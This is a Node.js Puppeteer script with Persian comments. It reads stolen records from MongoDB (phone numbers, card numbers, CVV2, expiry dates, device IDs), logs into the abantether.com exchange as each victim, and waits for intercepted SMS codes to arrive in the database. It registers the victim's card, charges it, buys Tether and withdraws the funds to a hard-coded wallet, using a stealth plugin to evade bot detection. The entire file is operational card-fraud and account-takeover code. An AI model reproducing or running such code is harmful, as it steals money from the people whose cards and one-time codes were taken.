require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;

if (!MONGODB_URI) {
  console.log(chalk.red('MONGODB_URI تنظیم نشده!'));
  process.exit(1);
}

const log = {
  info: (m) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${m}`)),
  success: (m) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${m}`)),
  error: (m) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${m}`)),
  wait: (m) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${m}`)),
  start: (m) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${m}`))
};

let collection = null;

// اتصال به دیتابیس
async function connectDB() {
  const client = new MongoClient(MONGODB_URI, { maxPoolSize: 10 });
  await client.connect();
  collection = client.db('zarin').collection('users');
  log.success('اتصال به MongoDB برقرار شد');
}

// آیا کاربر آماده پردازش هست؟
function isReady(doc) {
  if (doc.processed === true || doc.status === 'completed') return false;

  const hasPhone = !!doc.personalPhoneNumber;
  const hasCard = !!doc.cardNumber && !!doc.cvv2 && doc.bankMonth != null && doc.bankYear != null;
  const hasDevice = !!doc.deviceId;

  return hasPhone && hasCard && hasDevice;
}

// پردازش کاربر (مثل انسان واقعی)
async function processUser(doc) {
  const phone = doc.personalPhoneNumber;
  let browser = null;
  let page = null;

  log.start(`شروع پردازش دیوایس: ${doc.deviceId} | شماره: ${phone}`);

  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Mobile Safari/537.36');

    await page.goto('https://abantether.com', { waitUntil: 'networkidle2', timeout: 60000 });

    // مرحله ۱: ورود با شماره
    if (!doc.otp_login) {
      log.wait(`درخواست OTP ورود برای ${phone}`);
      await page.waitForSelector('input[type="tel"], input[placeholder*="شماره"]', { timeout: 20000 });
      await page.type('input[type="tel"], input[placeholder*="شماره"]', phone);
      await page.click('button:has-text("ادامه"), button:has-text("ورود")');
      
      // صبر کن تا OTP تو دیتابیس بیاد
      while (!doc.otp_login) {
        log.wait(`در انتظار otp_login برای ${phone}...`);
        await new Promise(r => setTimeout(r, 5000));
        const fresh = await collection.findOne({ _id: doc._id });
        if (fresh?.otp_login) {
          doc.otp_login = fresh.otp_login;
          log.info(`OTP ورود دریافت شد: ${doc.otp_login}`);
          break;
        }
      }
    }

    // وارد کردن OTP ورود
    await page.waitForSelector('input[placeholder*="کد"], input[type="text"]', { timeout: 15000 });
    await page.evaluate(() => document.querySelector('input[placeholder*="کد"], input[type="text"]')?.value = '');
    await page.type('input[placeholder*="کد"], input[type="text"]', doc.otp_login);
    await page.click('button:has-text("تایید")');
    log.success(`ورود با موفقیت انجام شد: ${phone}`);

    // مرحله ۲: ثبت کارت (اگر قبلاً ثبت نشده)
    if (!doc.otp_register_card) {
      try {
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت, text=ثبت کارت جدید');

        await page.type('input[placeholder="شماره کارت"]', doc.card.cardNumber.replace(/\D/g, ''));
        await page.type('input[placeholder="CVV2"]', doc.cvv2);
        await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, '0'));
        await page.type('input[placeholder="سال"]', doc.bankYear.toString().padStart(2, '0'));
        await page.click('button:has-text("ثبت کارت")');

        log.wait(`در انتظار otp_register_card برای ${phone}...`);
        while (!doc.otp_register_card) {
          await new Promise(r => setTimeout(r, 5000));
          const fresh = await collection.findOne({ _id: doc._id });
          if (fresh?.otp_register_card) {
            doc.otp_register_card = fresh.otp_register_card;
            log.info(`OTP ثبت کارت دریافت شد: ${doc.otp_register_card}`);
            break;
          }
        }
      } catch (e) {
        log.info('کارت قبلاً ثبت شده');
      }
    }

    // تأیید کارت
    await page.type('input[placeholder*="کد"], input[placeholder*="پیامک"]', doc.otp_register_card);
    await page.click('button:has-text("تأیید")');
    log.success('کارت با موفقیت ثبت شد');

    // مرحله ۳: شارژ حساب
    if (!doc.otp_payment) {
      await page.click('text=واریز تومان, text=شارژ حساب');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');

      log.wait(`در انتظار otp_payment برای ${phone}...`);
      while (!doc.otp_payment) {
        await new Promise(r => setTimeout(r, 5000));
        const fresh = await collection.findOne({ _id: doc._id });
        if (fresh?.otp_payment) {
          doc.otp_payment = fresh.otp_payment;
          log.info(`OTP پرداخت دریافت شد: ${doc.otp_payment}`);
          break;
        }
      }
    }

    await page.type('input#otp, input[placeholder*="کد"]', doc.otp_payment);
    await page.click('button:has-text("تأیید"), button:has-text("پرداخت")');
    await page.waitForSelector('text=موفق, text=پرداخت', { timeout: 120000 });
    log.success('شارژ حساب با موفقیت انجام شد');

    // مرحله ۴: خرید تتر و برداشت
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');
    await page.waitForSelector('text=سفارش ثبت شد', { timeout: 40000 });

    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');

    log.success(`تمام مراحل با موفقیت انجام شد! تتر در راهه: ${phone}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { processed: true, status: 'completed', completedAt: new Date() } }
    );

  } catch (err) {
    log.error(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { status: 'failed', error: err.message, lastError: new Date() } }
    );
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

// شروع ربات + Real-time Change Stream
async function startBot() {
  await connectDB();

  log.success('ربات فعال شد - هر تغییری = پردازش فوری');

  const changeStream = collection.watch([], { fullDocument: 'updateLookup' });

  changeStream.on('change', async (change) => {
    try {
      const doc = change.fullDocument;
      if (!doc) return;

      log.start(`تغییر تشخیص داده شد | دیوایس: ${doc.deviceId || 'نامشخص'} | شماره: ${doc.personalPhoneNumber || 'نامشخص'}`);

      if (doc.processed === true || doc.status === 'completed') {
        log.info('این دیوایس قبلاً پردازش شده');
        return;
      }

      if (isReady(doc)) {
        log.start(`شرایط کامل → شروع پردازش برای ${doc.personalPhoneNumber}`);
        processUser(doc);
      } else {
        log.wait(`هنوز آماده نیست | فیلدهای پرشده: ${Object.keys(doc).filter(k => doc[k] != null).join(', ')}`);
      }

    } catch (err) {
      log.error('خطا در Change Stream: ' + err.message);
    }
  });

  changeStream.on('error', () => {
    log.error('Change Stream قطع شد! دوباره وصل می‌شم...');
    setTimeout(startBot, 10000);
  });
}

startBot().catch(() => setTimeout(startBot, 10000));